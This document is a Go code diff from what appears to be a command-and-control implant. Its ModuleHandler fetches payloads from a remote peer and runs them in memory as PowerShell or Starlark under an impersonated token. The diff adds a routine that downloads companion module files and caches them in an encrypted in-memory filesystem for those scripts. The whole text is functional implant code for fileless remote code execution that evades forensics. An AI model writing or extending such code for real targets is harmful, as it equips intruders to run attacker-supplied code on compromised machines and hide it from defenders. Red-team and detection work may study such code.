@@ -41,6 +41,14 @@ func ModuleHandler(peerIP, file_to_download, payload_type, modName, checksum str
 		return logging.Sprintf("decompressing %s: %v", file_to_download, err)
 	}
 
+	// Multi-file modules: fetch every companion file and cache it in
+	// encrypted memfs so starlark scripts can read them transparently via
+	// read_file("mem:///...").
+	moduleFiles, err := uploadModuleFiles(peerIP, invocation)
+	if err != nil {
+		return logging.Sprintf("uploading module files: %v", err)
+	}
+
 	// switch on payload type, in memory execution
 	switch payload_type {
 	case "powershell":
@@ -94,7 +102,9 @@ func ModuleHandler(peerIP, file_to_download, payload_type, modName, checksum str
 	case "starlark":
 		err = executeWithToken(invocation.Token, func(token uintptr) error {
 			var execErr error
-			out, execErr = script.Run(payload_data, invocation.Argv, nil, token)
+			// module_files exposes the memfs paths of all companion files so
+			// the script can load them without hardcoding paths.
+			out, execErr = script.Run(payload_data, invocation.Argv, map[string]any{"module_files": moduleFiles}, token)
 			if execErr != nil {
 				out = logging.Sprintf("running starlark module: %v", execErr)
 			}
@@ -161,4 +171,36 @@ func downloadAndVerifyModule(file_to_download, checksum, peerIP string) (data []
 	}
 
 	return nil, fmt.Errorf("downloading %s: checksum verification failed after 3 attempts", file_to_download)
+}
+
+// uploadModuleFiles downloads every companion file listed in the invocation
+// and caches it in encrypted memfs (util.WriteFileAgent) so multi-file
+// starlark modules can read them transparently via read_file("mem:///...").
+//
+// The invocation only carries companion files when the module enabled them
+// via "module_files_memfs" in its config.json; an empty list is a no-op.
+func uploadModuleFiles(peerIP string, invocation def.ResolvedInvocation) (memPaths []string, err error) {
+	if len(invocation.ModuleFiles) == 0 {
+		return nil, nil
+	}
+
+	memPaths = make([]string, 0, len(invocation.ModuleFiles))
+	for _, f := range invocation.ModuleFiles {
+		raw, err := fetchFile(common.RuntimeConfig, peerIP, f.Name, "", f.Checksum)
+		if err != nil {
+			return nil, fmt.Errorf("downloading companion file %s: %w", f.Name, err)
+		}
+		data, err := util.Decompress(raw)
+		if err != nil {
+			return nil, fmt.Errorf("decompressing companion file %s: %w", f.Name, err)
+		}
+		// WriteFileAgent stores the file in encrypted memfs (AES-GCM when the
+		// agent file crypto key is set) and decrypts transparently on read.
+		if err := util.WriteFileAgent(f.MemPath, data, 0o600); err != nil {
+			return nil, fmt.Errorf("caching companion file to %s: %w", f.MemPath, err)
+		}
+		logging.Debugf("Cached module companion %s -> %s (%d bytes)", f.Name, f.MemPath, len(data))
+		memPaths = append(memPaths, f.MemPath)
+	}
+	return memPaths, nil
 }
